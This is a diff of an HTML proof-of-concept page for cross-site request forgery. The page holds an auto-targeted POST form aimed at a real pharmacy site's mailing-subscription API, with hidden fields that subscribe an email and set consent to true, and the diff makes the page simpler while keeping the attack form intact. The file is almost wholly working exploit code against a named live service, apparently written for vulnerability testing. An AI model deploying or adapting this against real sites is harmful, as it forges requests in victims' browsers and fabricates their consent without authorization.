@@ -2,60 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF PoC - Mailing Subscription</title>
+  <title>Pure HTML CSRF PoC - Mailing Subscription</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-    }
-    #result {
-      margin-top: 20px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      background: #f9f9f9;
+    iframe {
+      width: 100%;
       height: 200px;
-      overflow: auto;
+      border: 1px solid #ccc;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
-  <h2>CSRF PoC - Subscribe User to Mailing</h2>
-  <p>Click the button below to manually send the CSRF POST request.</p>
+  <h2>Pure HTML CSRF PoC - Subscribe to Newsletter</h2>
 
   <form 
     action="https://www.redcare-pharmacie.fr/homeone/api/bully/mailing-subscription/v1/fr/subscriptions" 
     method="POST" 
-    target="hiddenFrame" 
-    onsubmit="document.getElementById('result').innerHTML = 'Submitting request...';"
+    target="responseFrame"
   >
-    <!-- Example hidden fields -->
     <input type="hidden" name="email" value="noyono010101@gmail.com">
     <input type="hidden" name="newsletterType" value="general">
     <input type="hidden" name="consent" value="true">
-    
+
     <input type="submit" value="Subscribe via CSRF">
   </form>
 
-  <h3>Server Response:</h3>
-  <div id="result">No submission yet.</div>
-
-  <!-- Hidden iframe to capture response -->
-  <iframe 
-    name="hiddenFrame" 
-    style="display:none;" 
-    onload="displayResponse()">
-  </iframe>
-
-  <script>
-    function displayResponse() {
-      const iframe = document.getElementsByName('hiddenFrame')[0];
-      try {
-        const doc = iframe.contentDocument || iframe.contentWindow.document;
-        const responseText = doc.body ? doc.body.innerHTML : "No content";
-        document.getElementById('result').innerHTML = responseText;
-      } catch (e) {
-        document.getElementById('result').innerHTML = 'Could not access response (likely due to cross-origin restrictions).';
-      }
-    }
-  </script>
+  <h3>Server Response (if visible):</h3>
+  <iframe name="responseFrame"></iframe>
 </body>
 </html>
